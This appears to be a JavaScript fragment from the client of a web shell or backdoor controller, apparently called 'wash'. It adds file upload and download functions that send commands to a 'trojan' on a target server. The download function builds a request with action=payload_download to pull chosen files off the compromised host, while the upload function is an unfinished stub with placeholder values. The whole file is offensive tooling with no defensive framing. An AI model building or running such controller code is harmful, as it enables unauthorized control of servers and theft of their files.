// Here we pop open the wash object once again to patch in some tailored
// functionality.
wash.file = {
    up: function(){
        console.log('up');

        // assemble the command to send to the trojan
        wash.command.action = 'payload_blah';
        wash.command.cmd    = '';
        wash.command.args   = {one: 1, two: 2} ;

        // send the request upstream
        wash.send_and_receive();
    },

    // downloads a file
    down: function(args){
        console.log('down');

        // buffer the previous connection protocol, because we're necessarily
        // going to have to switch to GET for a moment
        var old_request_type = wash.connection.request_type;

        // alert the user if we're switching to GET from another protocol
        if(old_request_type != 'get'){
            var msg = "In order to download a file, a GET request must necessarily " +
                      "be made against the target server. Continue?";
            
            // cancel if the user is unwilling to change request types
            if(!confirm(msg)){ return false; }
        }

        // assemble the URL for the file download
        var url = wash.connection.protocol + '://';
        url += wash.connection.url + '?';
        url += 'args[file]=' + args.file + '&';
        url += 'action=payload_download';

        // download the file
        window.location.href = url;

        // switch back to the previous protocol
        wash.connection.request_type = old_request_type;
    },
}
